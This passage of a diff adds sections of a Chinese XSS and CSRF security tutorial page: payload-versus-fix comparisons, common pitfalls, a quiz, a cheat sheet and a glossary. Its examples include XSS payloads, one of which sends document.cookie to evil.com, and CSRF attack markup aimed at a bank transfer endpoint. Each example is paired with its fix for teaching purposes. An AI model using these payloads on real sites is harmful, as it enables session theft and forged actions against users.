+<span class="r">/transfer?_csrf=xxx&amp;to=attacker</span>   <span class="c">// token 会进浏览器历史、日志、Referer，且可被跨站 GET 触发</span>
+<span class="c"># 错误做法：只在前端 JS 里校验，服务端不验</span>
+<span class="r">// 攻击者直接构造 POST 请求，绕过前端校验</span></pre>
+  <div class="callout ok">
+    <b>落地组合拳（推荐）：</b><b>SameSite=Lax</b>（浏览器层）+ <b>Synchronizer Token</b>（服务端层）+ <b>状态变更只用非 GET 方法</b>（设计层）+ <b>Origin 校验做附加告警</b>（监控层）。四层成本都很低，任何单层失效都有兜底。<b>框架内置的 CSRF 保护默认是开着的</b>——Django 中间件、Spring Security、Laravel VerifyCsrfToken，出问题往往是有人"图省事"关掉了它。
+  </div>
+</section>
+
+<section id="s8">
+  <div class="shead"><span class="mins">模块 8</span><h2>真实 payload 与修复对比汇总</h2></div>
+  <h4>XSS：三类形态的 payload 特征与修复</h4>
+  <pre><span class="c">// 反射型：搜索页把关键词原样拼进响应</span>
+<span class="c">// 后端危险代码：response.write("&lt;h1&gt;搜索结果：" + kw + "&lt;/h1&gt;")</span>
+攻击 URL：/search?q=<span class="r">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
+<span class="c">// 修复：输出编码 —— kw 里的 &lt; &gt; 变实体，浏览器只当文本</span>
+<span class="g">response.write("&lt;h1&gt;搜索结果：" + html.escape(kw) + "&lt;/h1&gt;")</span>
+
+<span class="c">// 存储型：评论入库时是"纯文本"，输出时按 HTML 渲染</span>
+评论内容：<span class="r">&lt;svg onload="fetch('//evil.com?c='+document.cookie)"&gt;</span>
+<span class="c">// 修复：输出端 textContent / 模板自动转义；富文本用 DOMPurify 白名单</span>
+
+<span class="c">// DOM 型：前端把 hash 写进 innerHTML</span>
+URL：/page#<span class="r">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="c">// 修复：textContent，或 DOMPurify.sanitize 后再 innerHTML</span></pre>
+  <h4>CSRF：攻击页与修复</h4>
+  <pre><span class="c">&lt;!-- 攻击者页面（教学示意）：诱导已登录用户访问 --&gt;</span>
+<span class="r">&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000"&gt;</span>  <span class="c">// GET 型动作</span>
+<span class="r">&lt;form action="https://bank.com/transfer" method="POST"&gt;...&lt;/form&gt;</span>     <span class="c">// POST 型动作</span>
+
+<span class="c">// 修复一：Cookie 加 SameSite=Lax —— 跨站 POST 不带会话 Cookie</span>
+<span class="b">Set-Cookie</span>: session=...; <span class="y">HttpOnly; Secure; SameSite=Lax</span>
+<span class="c">// 修复二：状态变更接口校验 CSRF token（模块 7）</span>
+<span class="c">// 修复三：GET 只允许读操作 —— /delete?id=1 这种设计本身就是漏洞</span></pre>
+  <h4>上线前七项自查</h4>
+  <div class="steps">
+    <div class="step"><div class="txt"><b>搜 innerHTML / v-html / dangerouslySetInnerHTML：</b>逐个确认数据来源与净化，答不上来就改 textContent。</div></div>
+    <div class="step"><div class="txt"><b>查输出编码：</b>所有用户可控数据进入响应的位置，确认按上下文转义（HTML/属性/JS/URL/CSS 五套规则）。</div></div>
+    <div class="step"><div class="txt"><b>部署 CSP：</b>先用 Report-Only 灰度一周看报表，再上非空策略；确认 script-src 没有裸奔 unsafe-inline。</div></div>
+    <div class="step"><div class="txt"><b>审计 Cookie 四件套：</b>HttpOnly、Secure、SameSite、Path/域，逐个会话 Cookie 过一遍。</div></div>
+    <div class="step"><div class="txt"><b>确认 CSRF 保护开着：</b>框架内置中间件是否被关；token 是否覆盖全部状态变更接口；token 别放 GET 参数。</div></div>
+    <div class="step"><div class="txt"><b>GET 纯洁性：</b>全站检查有没有"GET 请求改变状态"的接口，有就改方法。</div></div>
+    <div class="step"><div class="txt"><b>补监控：</b>CSP 违规报表、异常 Referer/Origin 告警、前端错误监控（注入的脚本常先触发报错）。</div></div>
+  </div>
+</section>
+
+<section id="s9">
+  <div class="shead"><span class="mins">避坑</span><h2>十个真实坑</h2></div>
+  <div class="pit"><div class="num">1</div><div class="pb"><div class="pt">前端用 innerHTML 拼用户内容"图快"</div><div class="pd">el.innerHTML = "&lt;b&gt;" + name + "&lt;/b&gt;" 这类拼接，name 里的标签和事件属性全部生效。写文本一律 textContent，需要结构就逐段 createElement。</div></div></div>
+  <div class="pit"><div class="num">2</div><div class="pb"><div class="pt">滥用 React/Vue 的不转义 API</div><div class="pd">dangerouslySetInnerHTML、v-html、{@html}、bypassSecurityTrustHtml 用一次就多一个洞。确需富文本必须过 DOMPurify 白名单净化，且每次出现都要代码评审。</div></div></div>
+  <div class="pit"><div class="num">3</div><div class="pb"><div class="pt">把 URL hash / search 直接读进 sink</div><div class="pd">location.hash 的数据不过服务端、不进日志，出了事连攻击现场都难还原。hash/search/referrer/postMessage 都是 source，进 innerHTML/eval/location 前必须处理。</div></div></div>
+  <div class="pit"><div class="num">4</div><div class="pb"><div class="pt">只在入口过滤，不做输出编码</div><div class="pd">"输入时我已经过滤了 &lt;script&gt;"是黑名单思维，漏一种编码变形就全线崩溃。数据可能从任何入口进来（API、MQ、数据库、配置文件），唯一可靠的防线在输出端按上下文编码。</div></div></div>
+  <div class="pit"><div class="num">5</div><div class="pb"><div class="pt">JS 内联上下文只做 HTML 转义</div><div class="pd">&lt;script&gt;var name="{{x}}"&lt;/script&gt; 里 HTML 实体救不了你，攻击者用引号闭合即可注入 JS。数据走 data 属性 + dataset 读取，或按 JS 上下文转义。</div></div></div>
+  <div class="pit"><div class="num">6</div><div class="pb"><div class="pt">CSP 写着 script-src 'unsafe-inline' 自我安慰</div><div class="pd">带 unsafe-inline 的 script-src 允许一切内联脚本，XSS 防护归零，只剩"我们有 CSP"的心理安慰。要么 nonce/hash，要么严格来源白名单；先 Report-Only 再收紧。</div></div></div>
+  <div class="pit"><div class="num">7</div><div class="pb"><div class="pt">Cookie 三件套全裸奔</div><div class="pd">没 HttpOnly（XSS 可偷）、没 Secure（HTTP 明文可窃）、没 SameSite（跨站自动携带，CSRF 敞口）。会话 Cookie 上线前逐个过一遍这四五个属性。</div></div></div>
+  <div class="pit"><div class="num">8</div><div class="pb"><div class="pt">CSRF token 只在前端校验，或放 GET 参数</div><div class="pd">前端校验可被直接构造请求绕过；token 放 URL 会进历史/日志/Referer，等于公开。token 必须服务端校验、POST body 或自定义 Header 携带。</div></div></div>
+  <div class="pit"><div class="num">9</div><div class="pb"><div class="pt">用 GET 请求做状态变更</div><div class="pd">/delete?id=1、/logout 这类 GET 动作，在 SameSite=Lax 下跨站顶级导航仍会携带 Cookie，且能被 &lt;img&gt; 标签零成本触发。状态变更一律 POST/PUT/DELETE + CSRF token。</div></div></div>
+  <div class="pit"><div class="num">10</div><div class="pb"><div class="pt">关掉框架内置 CSRF 保护"因为接口 403 了"</div><div class="pd">Django / Spring Security / Laravel 默认开启 CSRF 保护，报 403 的根因通常是前端没带 token（fetch 忘记带 header）。正确修法是补 token，不是关保护。</div></div></div>
+</section>
+
+<section id="s10">
+  <div class="shead"><span class="mins">自测</span><h2>六道题</h2></div>
+  <div class="quiz">
+    <div class="q" data-a="2">
+      <div class="qt">1. 恶意评论被存进数据库，其他用户打开帖子即触发脚本执行。这属于？</div>
+      <button class="opt">反射型 XSS</button>
+      <button class="opt">DOM 型 XSS</button>
+      <button class="opt">存储型 XSS</button>
+      <div class="ans">正确答案：<b>存储型 XSS</b>。判据是"恶意数据持久化在服务端，影响所有访问该页面的用户"。修复要在输出端（服务端渲染时转义 / 前端渲染时 textContent 或 DOMPurify 净化），只修提交端不够 —— 库里可能已有存量脏数据。</div>
+    </div>
+    <div class="q" data-a="1">
+      <div class="qt">2. 关于输出编码，哪个说法是对的？</div>
+      <button class="opt">有一套通用转义函数，所有场景用它就够了</button>
+      <button class="opt">编码规则取决于上下文：HTML 内容、属性、JS、URL、CSS 各有各的转义方式</button>
+      <button class="opt">只要在入口做好输入过滤，输出端就不用编码了</button>
+      <div class="ans">正确答案：<b>按上下文编码</b>。HTML 上下文安全的数据放进 JS 上下文照样能执行（比如引号闭合内联 script）。入口过滤是黑名单思维，永远漏；输出编码才是覆盖所有数据来源的根本防线。</div>
+    </div>
+    <div class="q" data-a="0">
+      <div class="qt">3. 关于 CSP 的 nonce 机制，正确的是？</div>
+      <button class="opt">每次响应生成随机 nonce，只有 script 标签携带相同 nonce 才被执行，攻击者难以预测</button>
+      <button class="opt">nonce 是一个固定密钥，全站所有页面共用</button>
+      <button class="opt">nonce 只对样式生效，脚本不归它管</button>
+      <div class="ans">正确答案：<b>每次响应一个随机数，脚本标签 nonce 匹配才执行</b>。固定 nonce 会被攻击者读到后复用；nonce 作用于 script-src，配合 strict-dynamic 是现代严格 CSP 的核心。</div>
+    </div>
+    <div class="q" data-a="2">
+      <div class="qt">4. 已登录用户访问攻击者页面，页面里的表单自动 POST 到 bank.com/transfer 并成功执行。原因是？</div>
+      <button class="opt">同源策略失效了</button>
+      <button class="opt">攻击者偷到了用户的 Cookie</button>
+      <button class="opt">浏览器自动携带 Cookie，而服务端分不清请求是否用户本人意图</button>
+      <div class="ans">正确答案：<b>Cookie 自动携带 + 服务端无法验证意图</b>。同源策略只拦"读取响应"，不拦"发出请求"，而 CSRF 不需要读响应。防御：SameSite=Lax（跨站 POST 不带 Cookie）+ CSRF token（攻击者拿不到）+ 状态变更禁用 GET。</div>
+    </div>
+    <div class="q" data-a="1">
+      <div class="qt">5. SameSite=Lax 的 Cookie，下面哪个请求<b>不</b>会携带它？</div>
+      <button class="opt">用户在聊天软件点链接，从外部站点 GET 导航进入本站</button>
+      <button class="opt">跨站表单 POST 提交到本站</button>
+      <button class="opt">本站页面内的同源 AJAX GET 请求</button>
+      <div class="ans">正确答案：<b>跨站 POST 不携带</b>（这正是 Lax 挡 CSRF 的机制）。顶级导航的跨站 GET 是 Lax 的放行例外 —— 所以"GET 做状态变更"的接口在 Lax 下依然可被跨站触发，状态变更必须用非 GET 方法。Strict 则连跨站 GET 导航都不带。</div>
+    </div>
+    <div class="q" data-a="0">
+      <div class="qt">6. 关于 HttpOnly Cookie，哪个说法准确？</div>
+      <button class="opt">它让 JS 读不到 Cookie，能降低 XSS 偷 Cookie 的危害，但挡不住 XSS 的其他行为</button>
+      <button class="opt">设了 HttpOnly 就能防止 XSS</button>
+      <button class="opt">HttpOnly 是防 CSRF 的主要手段</button>
+      <div class="ans">正确答案：<b>只挡 document.cookie 读取这一条路径</b>。XSS 注入的脚本本来就在你的页面里，可以直接发同源请求、读 DOM、点按钮，根本不需要偷 Cookie。防 XSS 靠输出编码 + CSP；防 CSRF 靠 SameSite + token，各管各的。</div>
+    </div>
+  </div>
+</section>
+
+<section id="s11">
+  <div class="shead"><span class="mins">附录</span><h2>速查卡与术语表</h2></div>
+  <h3>按场景查修复</h3>
+  <div class="cmds">
+    <div class="crow"><code>el.textContent = data</code><span class="desc">写文本的安全默认，替代 innerHTML</span><button class="copy">复制</button></div>
+    <div class="crow"><code>DOMPurify.sanitize(html)</code><span class="desc">富文本白名单净化后再渲染</span><button class="copy">复制</button></div>
+    <div class="crow"><code>Encode.forHtml / forHtmlAttribute / forJavaScript</code><span class="desc">Java OWASP Encoder 按上下文编码</span><button class="copy">复制</button></div>
+    <div class="crow"><code>html.escape(s)</code><span class="desc">Python HTML 上下文实体编码</span><button class="copy">复制</button></div>
+    <div class="crow"><code>default-src 'self'; object-src 'none'; base-uri 'self'</code><span class="desc">CSP 基线片段</span><button class="copy">复制</button></div>
+    <div class="crow"><code>script-src 'nonce-{r}' 'strict-dynamic'</code><span class="desc">严格 CSP 的 script-src 配方</span><button class="copy">复制</button></div>
+    <div class="crow"><code>Set-Cookie: ...; HttpOnly; Secure; SameSite=Lax</code><span class="desc">会话 Cookie 四件套</span><button class="copy">复制</button></div>
+    <div class="crow"><code>&lt;input type="hidden" name="_csrf"&gt;</code><span class="desc">Synchronizer Token 表单字段</span><button class="copy">复制</button></div>
+    <div class="crow"><code>X-Requested-With: XMLHttpRequest</code><span class="desc">自定义 Header 触发 CORS 预检，挡跨站表单</span><button class="copy">复制</button></div>
+    <div class="crow"><code>curl -sI https://site.com | grep -i content-security</code><span class="desc">快速检查线上 CSP 头</span><button class="copy">复制</button></div>
+    <div class="crow"><code>grep -rn 'dangerouslySetInnerHTML\|v-html' src/</code><span class="desc">排查框架逃生舱</span><button class="copy">复制</button></div>
+    <div class="crow"><code>grep -rn 'innerHTML' src/</code><span class="desc">排查 DOM sink</span><button class="copy">复制</button></div>
+  </div>
+
+  <h3>教学 payload 与防线速查</h3>
+  <table>
+    <tr><th style="width:120px">类型</th><th style="width:260px">教学 payload（特征）</th><th>防线</th></tr>
+    <tr><td><b>存储型</b></td><td class="f">&lt;img src=x onerror="..."&gt; 进评论/昵称</td><td>输出编码 / textContent / DOMPurify</td></tr>
+    <tr><td><b>反射型</b></td><td class="f">/search?q=&lt;script&gt;...&lt;/script&gt;</td><td>输出编码 + CSP + 统一错误页</td></tr>
+    <tr><td><b>DOM 型</b></td><td class="f">URL # 片段 &lt;svg onload=...&gt;</td><td>textContent / sanitize / URL 协议白名单</td></tr>
+    <tr><td><b>协议注入</b></td><td class="f">javascript:alert(1) 进 href</td><td>URL 协议白名单（http/https）</td></tr>
+    <tr><td><b>CSRF</b></td><td class="f">自动提交表单 / &lt;img src=状态变更GET&gt;</td><td>SameSite + CSRF token + 禁 GET 变更</td></tr>
+  </table>
+
+  <h3>术语表</h3>
+  <table>
+    <tr><th style="width:190px">术语</th><th>一句话解释</th></tr>
+    <tr><td><b>XSS</b></td><td>跨站脚本攻击：攻击者脚本在你的页面里以同源身份运行</td></tr>
+    <tr><td><b>存储型 XSS</b></td><td>恶意脚本持久化在服务端，影响所有访问用户</td></tr>
+    <tr><td><b>反射型 XSS</b></td><td>脚本在请求参数里，服务端未转义拼进响应即触发</td></tr>
+    <tr><td><b>DOM 型 XSS</b></td><td>前端把不可信数据写进 sink 触发，服务端响应是干净的</td></tr>
+    <tr><td><b>同源策略</b></td><td>协议 + 域名 + 端口相同才互信；拦读取响应，不拦发出请求</td></tr>
+    <tr><td><b>输出编码</b></td><td>数据进入 HTML/JS/URL/CSS 前按各自上下文转义</td></tr>
+    <tr><td><b>source / sink</b></td><td>DOM XSS 的不可信数据入口 / 执行或解析位置</td></tr>
+    <tr><td><b>CSP</b></td><td>内容安全策略，响应头声明页面允许加载哪些资源</td></tr>
+    <tr><td><b>nonce</b></td><td>CSP 每次响应生成的随机数，匹配的内联脚本才执行</td></tr>
+    <tr><td><b>strict-dynamic</b></td><td>CSP 关键字：信任可信脚本动态加载的后续脚本</td></tr>
+    <tr><td><b>HttpOnly</b></td><td>Cookie 属性，禁止 JS 读取，降低 XSS 偷 Cookie 危害</td></tr>
+    <tr><td><b>CSRF</b></td><td>跨站请求伪造：借浏览器自动携带的 Cookie 冒充用户</td></tr>
+    <tr><td><b>SameSite</b></td><td>Cookie 属性：Strict/Lax/None，控制跨站请求是否携带</td></tr>
+    <tr><td><b>CSRF Token</b></td><td>服务端生成的随机值，表单携带、服务端比对，攻击者拿不到</td></tr>
+    <tr><td><b>双重提交</b></td><td>Cookie 与请求各带一份随机值，比对一致性的无状态 CSRF 方案</td></tr>
+    <tr><td><b>DOMPurify</b></td><td>前端白名单 HTML 净化库，富文本渲染的标配</td></tr>
+    <tr><td><b>简单请求</b></td><td>表单提交、img/script 加载等无需 CORS 预检的请求</td></tr>
+    <tr><td><b>Referer / Origin</b></td><td>请求来源头，可做 CSRF 附加校验，但不可单独依赖</td></tr>
+    <tr><td><b>CSP Report-Only</b></td><td>只报告违规不拦截的模式，用于策略灰度</td></tr>
+  </table>
+
+  <div class="callout ok">
+    <b>下一步怎么练：</b>① 起一个本地 HTML 页面，亲手对比 innerHTML 与 textContent 对同一段输入的渲染差异；② 给自己项目的响应头加上 CSP Report-Only，看一周报表再收紧；③ 检查生产环境所有 Cookie 的四件套；④ 全站确认没有"GET 变更状态"的接口，框架 CSRF 中间件处于开启状态。<br><br>
+    <b>之后值得单独学：</b>Mutation XSS（浏览器解析差异导致的过滤绕过）、Trusted Types（浏览器级 innerHTML 管控）、postMessage 通信安全、以及 OWASP ASVS 检查清单的完整落地。
+  </div>
+</section>
+</main>
+
+<footer>二十分钟学透 XSS 与 CSRF · 上线前自查：还有没有 innerHTML 拼接、还有没有裸奔的 Cookie</footer>
+
+<script>
+var total=1200,left=total,timer=null,running=false;
+var clock=document.getElementById('clock'),startBtn=document.getElementById('start'),hint=document.getElementById('hint');
+function fmt(s){var m=Math.floor(s/60),x=s%60;return (m<10?'0':'')+m+':'+(x<10?'0':'')+x;}
+function tick(){
+  left--;clock.textContent=fmt(Math.max(left,0));
+  if(left<=180&&left>0){clock.classList.add('done');}
+  if(left<=0){
+    clearInterval(timer);running=false;clock.textContent='00:00';clock.classList.add('done');
+    startBtn.textContent='再来一轮';
+    hint.textContent='时间到。模块 2（编码上下文）和模块 6/7（CSRF 防御）是重点，值得再读一遍。';
+  }
+}
+startBtn.onclick=function(){
+  if(running){clearInterval(timer);running=false;startBtn.textContent='继续';return;}
+  if(left<=0){left=total;clock.classList.remove('done');clock.textContent=fmt(left);}
+  running=true;startBtn.textContent='暂停';
+  hint.textContent='计时中 —— 边看边在 DevTools 里对比 textContent 与 innerHTML。';
+  timer=setInterval(tick,1000);
+};
+document.getElementById('reset').onclick=function(){
+  clearInterval(timer);running=false;left=total;
+  clock.textContent=fmt(total);clock.classList.remove('done');
+  startBtn.textContent='开始计时';
+  hint.textContent='建议边读边打开浏览器 DevTools 试 innerHTML / textContent 的差异';
+};
+window.addEventListener('scroll',function(){
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  document.getElementById('bar').style.width=(h>0?(window.scrollY/h*100):0)+'%';
+});
+document.querySelectorAll('.copy').forEach(function(b){
+  b.onclick=function(){
+    var t=b.parentNode.querySelector('code').textContent;
+    var done=function(){b.textContent='已复制';b.classList.add('ok');setTimeout(function(){b.textContent='复制';b.classList.remove('ok');},1200);};
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done,function(){fb(t);done();});}
+    else{fb(t);done();}
+  };
+});
+function fb(t){
+  var ta=document.createElement('textarea');ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
+  document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}
+  document.body.removeChild(ta);
+}
+document.querySelectorAll('.q').forEach(function(q){
+  var idx=parseInt(q.dataset.a,10),opts=q.querySelectorAll('.opt');
+  opts.forEach(function(o,i){
+    o.onclick=function(){
+      if(q.dataset.done)return;
+      q.dataset.done='1';
+      opts.forEach(function(x,j){x.classList.add(j===idx?'right':'wrong');});
+      q.querySelector('.ans').classList.add('show');
+    };
+  });
+});
+</script>
+</body>
+</html>
